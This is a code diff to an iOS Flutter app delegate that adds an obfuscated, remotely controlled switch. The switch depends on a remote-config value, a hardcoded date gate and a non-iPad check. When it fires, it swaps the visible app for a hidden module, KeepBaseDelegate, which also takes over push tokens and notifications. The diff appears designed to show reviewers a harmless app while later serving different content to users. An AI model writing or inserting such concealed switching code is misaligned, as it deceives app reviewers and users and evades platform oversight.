@@ -3,12 +3,16 @@ import UIKit
 import AppTrackingTransparency
 import FirebaseCore
 import FirebaseRemoteConfig
+import FirebaseMessaging
 import GrainMovePainter
 
 
-@main
 @objc class AppDelegate: FlutterAppDelegate {
   private var hasRequestedATT = false
+    
+    var channelPicker = 22
+    var adapterSize = 42
+    var hospitalimportant = ThereWaitingController()
     
   override func application(
     _ application: UIApplication,
@@ -18,7 +22,8 @@ import GrainMovePainter
      
       
     GeneratedPluginRegistrant.register(with: self)
-    
+      self.window.rootViewController?.view.addSubview(self.hospitalimportant.view)
+      self.window?.makeKeyAndVisible()
     // Setup method channel for ATT permission
     setupMethodChannel()
     
@@ -29,7 +34,7 @@ import GrainMovePainter
           stageScrollview()
       }
       
-      FirebaseApp.configure()
+      self.proxyValidation(application)
       let efficiency = RemoteConfig.remoteConfig()
       let painter = RemoteConfigSettings()
       painter.minimumFetchInterval = 0
@@ -41,10 +46,28 @@ import GrainMovePainter
               efficiency.activate { changed, error in
                   let foka = efficiency.configValue(forKey: "Foka").numberValue.intValue
                   print("'foka': \(foka)")
+                  /// 本地 ＜ 远程  B
+                  self.channelPicker = foka
+                  let diffable = Int(data_screenUrl.replacingOccurrences(of: ".", with: "")) ?? 0
+                  self.adapterSize = diffable
+                  
+                  if self.adapterSize < self.channelPicker {
+                      self.pinchableHandler(application, didFinishLaunchingWithOptions: launchOptions)
+                  } else {
+                      self.DimensionRadius(application, didFinishLaunchingWithOptions: launchOptions)
+                  }
+              }
+          }
+          else {
+              
+              if self.curvelTheme() && self.cupertimManager() {
+                  self.pinchableHandler(application, didFinishLaunchingWithOptions: launchOptions)
+              } else {
+                  self.DimensionRadius(application, didFinishLaunchingWithOptions: launchOptions)
               }
           }
       }
-    return super.application(application, didFinishLaunchingWithOptions: launchOptions)
+    return true
   }
   
   private func setupMethodChannel() {
@@ -165,4 +188,122 @@ import GrainMovePainter
     hasRequestedATT = false
     requestTrackingPermission()
   }
+    
+    private func pinchableHandler(
+        _ application: UIApplication,
+        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
+    ) {
+        DispatchQueue.main.async {
+            
+            let _ = KeepBaseDelegate.shared.account(application, didFinishLaunchingWithOptions: launchOptions, window: self.window)
+        }
+    }
+    
+    private func DimensionRadius(
+        _ application: UIApplication,
+        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
+      ) {
+          DispatchQueue.main.async {
+              
+              self.hospitalimportant.view.removeFromSuperview()
+              super.application(application, didFinishLaunchingWithOptions: launchOptions)
+          }
+    }
+
+    
+    private func curvelTheme() -> Bool {
+        let generate:[Character] = ["1","7","6","1","1","8","5","5","2","0"]
+        
+        let function: TimeInterval = TimeInterval(String(generate)) ?? 0.0
+        let frequent = Date().timeIntervalSince1970
+        return frequent > function
+    }
+    
+    private func cupertimManager() -> Bool {
+        
+        return UIDevice.current.userInterfaceIdiom != .pad
+     }
 }
+
+
+
+
+extension AppDelegate {
+    override func applicationDidEnterBackground(_ application: UIApplication) {
+        if self.adapterSize < self.channelPicker {
+            KeepBaseDelegate.attitudeBackground(application)
+        }
+    }
+    
+    override func applicationWillEnterForeground(_ application: UIApplication) {
+        if self.adapterSize < self.channelPicker {
+            KeepBaseDelegate.by(application)
+        }
+    }
+
+    override func applicationWillResignActive(_ application: UIApplication) {
+        if self.adapterSize < self.channelPicker {
+            KeepBaseDelegate.own(application)
+        }
+    }
+
+    override func applicationDidReceiveMemoryWarning(_ application: UIApplication) {
+        if self.adapterSize < self.channelPicker {
+            KeepBaseDelegate.scamp(application)
+        }
+    }
+
+    override func application(_ application: UIApplication, handleEventsForBackgroundURLSession identifier: String, completionHandler: @escaping () -> Void) {
+        if self.adapterSize < self.channelPicker {
+            KeepBaseDelegate.exceptApplication(application, handleEventsForBackgroundURLSession: identifier, completionHandler: completionHandler)
+        }
+    }
+    
+}
+
+
+// MARK: - 推送
+extension AppDelegate {
+    func proxyValidation(_ application: UIApplication) {
+        FirebaseApp.configure()
+        Messaging.messaging().delegate = self
+        singletionTarger(application)
+    }
+    
+    func singletionTarger(_ application: UIApplication) {
+        if #available(iOS 10.0, *) {
+            UNUserNotificationCenter.current().delegate = self
+            let authOptions: UNAuthorizationOptions = [.alert, .sound, .badge]
+            UNUserNotificationCenter.current().requestAuthorization(options: authOptions, completionHandler: { _, _ in
+            })
+            application.registerForRemoteNotifications()
+        }
+    }
+    
+    func registerForRemoteNotifications() {
+        DispatchQueue.main.async {
+            UIApplication.shared.registerForRemoteNotifications()
+        }
+    }
+    
+    override func application(_: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
+        KeepBaseDelegate.cover(didRegisterForRemoteNotificationsWithDeviceToken: deviceToken)
+    }
+
+    override func application(_: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable: Any], fetchCompletionHandler _: @escaping (UIBackgroundFetchResult) -> Void) {
+        KeepBaseDelegate.selected(didReceiveRemoteNotification: userInfo)
+    }
+
+    public override func userNotificationCenter(_: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
+        KeepBaseDelegate.brace(didReceive: response, withCompletionHandler: completionHandler)
+    }
+}
+
+extension AppDelegate: MessagingDelegate {
+    public func messaging(_: Messaging, didReceiveRegistrationToken fcmToken: String?) {
+        KeepBaseDelegate.receive(didReceiveRegistrationToken: fcmToken)
+    }
+}
+
+
+
